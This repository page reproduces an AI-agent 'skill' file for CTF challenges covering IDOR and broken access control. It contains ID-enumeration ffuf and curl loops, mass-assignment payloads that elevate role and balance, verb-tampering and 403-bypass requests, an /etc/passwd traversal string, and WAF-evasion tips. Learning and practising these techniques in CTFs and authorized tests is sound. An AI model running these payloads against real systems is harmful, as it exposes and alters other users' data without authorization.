# IDOR & Broken Access Control

[Оглавление](https://raw.githubusercontent.com/BigBread57/zametki/main/INDEX.md) · [Происхождение и ограничения](https://raw.githubusercontent.com/BigBread57/zametki/main/SOURCES.md)

> Справочный документ. Инструкции и примеры ниже принадлежат источнику; они не подтверждают состояние вашей системы и не запускаются автоматически. Чтение этого файла не устанавливает скил, инструменты или MCP.

Источники этого текста:

- [Salman0x01/ctf-ai-agent-skills / instructions/web/idor-access-control.md](https://github.com/Salman0x01/ctf-ai-agent-skills/blob/0e91c90a7125c6591a56f51276275905f2dfb017/instructions/web/idor-access-control.md)

---

---
name: idor-access-control
category: web
triggers: [idor, "id=", uuid, "/users/", "/api/", object-reference, mass-assignment, forced-browsing, "admin", privilege-escalation, verb-tampering, parameter-tampering, bola]
tools: [burpsuite, ffuf, curl, autorize, arjun, wfuzz]
priority: high
description: Find and exploit broken access control - IDOR/BOLA, privilege escalation, mass assignment, forced browsing, and HTTP verb tampering.
---
# IDOR & Broken Access Control

## Trigger context
Fire when a request references an object you own by an identifier (`?id=`, `/users/1001`, `/orders/AB12`, a UUID, a filename), when the app has role tiers (user vs admin), when JSON bodies mirror DB fields, or when some routes are hidden behind the UI but reachable directly. This is OWASP A01 and the #1 CTF/web-app finding.

## Objective
Access or modify a resource that belongs to another user (horizontal) or that requires higher privilege (vertical), without proper authorization. Deliverable = reading/altering victim/admin data using YOUR session.

## Methodology (decision tree)
1. Map ownership: log in as two low-priv accounts (A and B). Capture every request that returns "my" data.
2. Swap the identifier from A's request into B's session (and vice-versa). Response returns A's data -> horizontal IDOR.
3. Identifier not sequential (UUID/hash)? Look for leaks (in listings, `Location` headers, exports, referrer), predictable encoding (base64 of an int), or GUID-in-JS.
4. Vertical: replay an admin action captured elsewhere (or guessed) with a low-priv token. Accepted -> vertical escalation.
5. Forced browsing: fuzz for hidden endpoints/roles (`/admin`, `/api/v2`, `/internal`).
6. Mass assignment: add privileged JSON fields the UI never sends (`"role":"admin"`, `"isAdmin":true`, `"verified":true`) to create/update requests.
7. Method/verb tampering: if `GET` is blocked, try `POST/PUT/PATCH/DELETE`, `HEAD`, or override headers (`X-HTTP-Method-Override`).
8. Parameter tampering: negative/zero IDs, array wrapping, JSON vs form, adding `?admin=1`, duplicate params (HPP).

## Commands & payloads
```bash
# Enumerate sequential object IDs with your own cookie (Burp Intruder equivalent)
ffuf -w ids.txt -u "https://target/api/orders/FUZZ" \
  -H "Cookie: session=<LOWPRIV>" -mc 200 -fr "Access denied"

# Range sweep + diff on content length to spot other users' records
seq 1000 1100 > ids.txt
for i in $(cat ids.txt); do
  curl -s -o /dev/null -w "%{http_code} %{size_download} id=$i\n" \
    -H "Cookie: session=<LOWPRIV>" "https://target/api/users/$i"
done

# Discover hidden/privileged endpoints (forced browsing)
ffuf -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
  -u "https://target/FUZZ" -H "Cookie: session=<LOWPRIV>" -mc 200,201,401,403

# Find unlinked parameters (mass-assignment candidates)
arjun -u "https://target/api/profile" -m JSON --headers "Cookie: session=<LOWPRIV>"
```
```http
### Horizontal IDOR: your session, victim's id
GET /api/users/1002/invoices HTTP/1.1
Cookie: session=<YOUR_LOWPRIV_SESSION>

### Mass assignment: inject fields the client never renders
PATCH /api/users/me HTTP/1.1
Content-Type: application/json
Cookie: session=<YOUR_LOWPRIV_SESSION>

{"email":"me@x.com","role":"admin","account_balance":999999,"isVerified":true}

### Verb tampering: DELETE blocked on GET-only ACL check
POST /admin/users/5/delete HTTP/1.1
X-HTTP-Method-Override: DELETE
Cookie: session=<YOUR_LOWPRIV_SESSION>

### Parameter pollution / type juggling
GET /api/orders?user_id=1002&user_id=1001 HTTP/1.1
GET /api/users/-1 HTTP/1.1        # boundary
POST /api/report {"user_id":["1001","1002"]}   # array wrap bypasses == check
```

```http
### 403-bypass primitives (path & header tricks on a denied route)
GET /admin HTTP/1.1          -> 403, then try:
GET /admin/ ,  /admin/. ,  //admin//  ,  /./admin  ,  /admin%20  ,  /admin%09
GET /%2e/admin , /admin..;/ , /Admin , /ADMIN        # case & normalization
X-Original-URL: /admin        # front-end proxy authz bypass
X-Rewrite-URL: /admin
X-Forwarded-For: 127.0.0.1     # internal-only endpoints
Referer: https://target/admin  # some apps trust referer for step gating
```

## Branching logic
- Sequential ID + access granted -> automate enumeration, dump all users, grep for the flag.
- Non-sequential ID -> find the leak/oracle first; brute-forcing UUIDv4 is infeasible.
- 403 on direct access -> try verb tampering, path case/encoding (`/Admin`, `/admin/`, `/admin/.`, `%2e`), and `X-Original-URL`/`X-Rewrite-URL` header bypasses.
- Update endpoint present -> always test mass assignment before giving up.
- Use Burp Autorize/Auth Analyzer to auto-diff low-priv vs high-priv responses at scale.

## Encoded / indirect reference tricks
- Base64 IDs: decode, increment the integer, re-encode (`echo -n 1001 | base64`).
- Hashed IDs: check for MD5/SHA of a small int (`for i in $(seq 1 100); do echo -n $i | md5sum; done | grep <hash>`).
- Filenames/exports: `/download?file=../../etc/passwd` blends IDOR with path traversal.
- GUIDs leaked in listing/search responses, `Location` headers, JS bundles, or email links — collect them first, then replay cross-account.

## Common pitfalls
- Same content-length for allowed/denied can mask success; diff the body, not just the code.
- Some apps return `200` with an error JSON on denial (`{"error":"forbidden"}`) — filter on body text, not status.
- Rate limiting/WAF on enumeration — throttle, randomize, use authenticated slow sweeps.
- Mass assignment silently ignores unknown fields on strict serializers; confirm the field name from API docs/GraphQL schema/error messages.
- Don't destroy shared CTF state (DELETE/PATCH on other players' data) unless the challenge is single-tenant.

## Workflow with two accounts (the reliable method)
1. Register/obtain accounts A and B (and an admin if the challenge grants one).
2. Proxy all traffic through Burp; browse every feature as A, tagging requests that carry an object identifier.
3. In Burp, use Autorize/Auth Analyzer: set B's session as the "low-priv" token and replay A's requests automatically — the extension flags every response that leaks A's data to B.
4. For collections, script a numeric/UUID sweep and diff response bodies; export anything with unexpected `200`s.
5. Confirm write-side flaws (mass assignment, verb tampering) with a follow-up read proving the state actually changed.

## Proof / verification
Show a request made with YOUR low-priv session returning another user's or admin-only data (name, email, balance, flag), or a state change (role elevated, order reassigned) confirmed by a follow-up read. The elevated privilege should unlock a resource that was `403` before.

## Cross-references
- [sa--instructions--web--auth-jwt-session.md](https://raw.githubusercontent.com/BigBread57/zametki/main/05-web/sa--instructions--web--auth-jwt-session.md) — forge a token to become admin instead of/alongside IDOR.
- [sa--instructions--web--api-graphql-rest.md](https://raw.githubusercontent.com/BigBread57/zametki/main/05-web/sa--instructions--web--api-graphql-rest.md) — GraphQL node IDs and REST collections are IDOR-rich; introspection reveals object fields.
- [sa--instructions--web--nosql-injection.md](https://raw.githubusercontent.com/BigBread57/zametki/main/05-web/sa--instructions--web--nosql-injection.md) — operator injection can also bypass ownership filters.

## Credible sources
- https://portswigger.net/web-security/access-control
- https://portswigger.net/web-security/access-control/idor
- https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/
- https://book.hacktricks.xyz/pentesting-web/idor
- https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Direct%20Object%20References/README.md
